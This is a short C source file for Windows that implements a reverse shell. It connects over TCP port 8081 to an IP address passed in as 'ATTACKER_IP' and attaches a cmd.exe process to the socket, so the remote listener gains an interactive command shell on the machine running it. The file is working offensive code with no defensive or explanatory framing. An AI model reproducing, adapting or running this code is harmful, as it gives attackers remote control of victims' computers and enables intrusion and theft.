#include <winsock2.h>
#include <stdio.h>
#include <windows.h>
#include <WS2tcpip.h>
#pragma comment(lib, "Ws2_32.lib");


int main(int argc, char* argv[])
{
    if (argc != 2) {
        printf("Usage: %s <ATTACKER_IP>\n", argv[0]);
        return 1;
    }

    SOCKET shell;
    sockaddr_in shell_addr;
    WSADATA wsa;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    char RecvServer[512];
    int connection;
    int port = 8081;

    char* ip_addr = argv[1];

    WSAStartup(MAKEWORD(2, 2), &wsa);
    shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

    shell_addr.sin_port = htons(port);
    shell_addr.sin_family = AF_INET;
    shell_addr.sin_addr.s_addr = inet_addr(ip_addr);

    connection = WSAConnect(shell, (SOCKADDR*)&shell_addr, sizeof(shell_addr), NULL, NULL, NULL, NULL);

    if (connection == SOCKET_ERROR) {
        printf("[!] Connection to the target server failed, Please try again\n");
        exit(0);
    } else {
        recv(shell, RecvServer, sizeof(RecvServer), 0);
        memset(&si, 0, sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)shell;
        CreateProcess(NULL, L"cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        memset(RecvServer, 0, sizeof(RecvServer));
    }
    return 0;
}


